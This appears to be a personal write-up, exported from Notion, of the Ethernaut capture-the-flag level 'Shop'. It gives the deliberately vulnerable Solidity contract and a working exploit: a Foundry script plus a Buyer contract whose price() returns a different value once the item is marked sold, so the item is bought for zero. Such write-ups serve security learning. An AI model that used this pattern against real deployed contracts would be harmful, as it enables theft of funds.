---
title: "Shop"
date: "2024-02-25T10:39:00.000Z"
lastmod: "2024-02-26T09:33:00.000Z"
draft: false
difficulty: "⭐⭐⭐"
prev: "Denial-edd8839ce63a4a2194adfd2905ad4940"
weight: 22
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/21"
next: "Dex-2e8b616a5bd64b05874e71b8b4a30ac7"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "b6f28652-a236-42f2-805f-d50f577ea02f"
  created_time: "2024-02-25T10:39:00.000Z"
  last_edited_time: "2024-02-26T09:33:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel21.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "aa1cb61f-428e-4dc4-abad-06b3092cb0ce"
        name: "⭐⭐⭐"
        color: "green"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Denial-edd8839ce63a4a2194adfd2905ad4940"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Denial-edd8839ce63a4a2194adfd2905ad4940"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 22
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/21"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Dex-2e8b616a5bd64b05874e71b8b4a30ac7"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Dex-2e8b616a5bd64b05874e71b8b4a30ac7"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Shop"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Shop"
          href: null
  url: "https://www.notion.so/Shop-b6f28652a23642f2805fd50f577ea02f"
  public_url: null
UPDATE_TIME: "2024-02-26T13:02:26.334Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


Сan you get the item from the shop for less than the price asked?


### Things that might help:

- `Shop` expects to be used from a `Buyer`
- Understanding restrictions of view functions

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Buyer, Shop} from '../src/21.sol';

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_21");

        vm.startBroadcast(deployerPrivateKey);

        Buyer buyer = new Buyer(addr);
        buyer.buy();

        Shop shop = Shop(addr);

        console.logBool(shop.isSold());
        console.logUint(shop.price());

        vm.stopBroadcast();

    }
}
```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Shop {
  function isSold() external view returns(bool);
  function price() external view returns(uint);
  function buy() external;
}

contract Buyer {
  Shop shop;

  constructor(address _shop) {
    shop = Shop(_shop); 
  }

  function price() public view returns (uint p) {
    if (shop.isSold() == true) {
      return 0;
    }
    return 100;
  }

  function buy() public {
    shop.buy();
  }
}
```


Contracts can manipulate data seen by other contracts in any way they want.


It's unsafe to change the state based on external and untrusted contracts logic.

